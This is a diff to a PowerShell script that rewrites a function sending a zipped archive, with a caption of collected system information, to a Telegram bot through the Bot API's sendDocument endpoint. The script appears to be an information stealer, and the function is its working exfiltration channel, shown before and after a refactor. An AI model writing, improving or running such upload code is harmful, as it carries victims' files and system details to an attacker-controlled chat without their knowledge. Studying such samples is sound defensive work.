@@ -249,39 +249,19 @@ function Send-ResultToTelegram {
     $caption = Get-Content $SystemInfoPath | Out-String
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
     try {
-        $form = @{
-            chat_id = $ChatID
-            caption = $caption
-        }
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        $bodyLines = @()
-        foreach ($k in $form.Keys) {
-            $bodyLines += "--$boundary$LF"
-            $bodyLines += "Content-Disposition: form-data; name=`"$k`"$LF$LF$form[$k]$LF"
-        }
-        $fileName = [System.IO.Path]::GetFileName($ZipPath)
-        $fileBytes = [System.IO.File]::ReadAllBytes($ZipPath)
-        $bodyLines += "--$boundary$LF"
-        $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF"
-        $bodyLines += "Content-Type: application/zip$LF$LF"
-        $bodyStream = [System.IO.MemoryStream]::new()
-        $writer = [System.IO.StreamWriter]::new($bodyStream)
-        foreach ($line in $bodyLines) { $writer.Write($line) }
-        $writer.Flush()
-        $bodyStream.Write($fileBytes,0,$fileBytes.Length)
-        $writer2 = [System.IO.StreamWriter]::new($bodyStream)
-        $writer2.Write(\"$LF--$boundary--$LF\")
-        $writer2.Flush()
-        $bodyStream.Position = 0
-
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add(\"Content-Type\", \"multipart/form-data; boundary=$boundary\")
-        $response = $wc.UploadData($url, $bodyStream.ToArray())
-        $result = [System.Text.Encoding]::UTF8.GetString($response)
-        if ($result -like '*\"ok\":true*') { return $true } else { return $false }
+        $resp = Invoke-WebRequest -Uri $url `
+            -Method Post `
+            -ContentType "multipart/form-data" `
+            -Form @{
+                chat_id = $ChatID
+                caption = $caption
+                document = Get-Item $ZipPath
+            }
+        if ($resp.StatusCode -eq 200) { return $true }
+        else { return $false }
     } catch { return $false }
 }
+
 
 
 Start-Execution
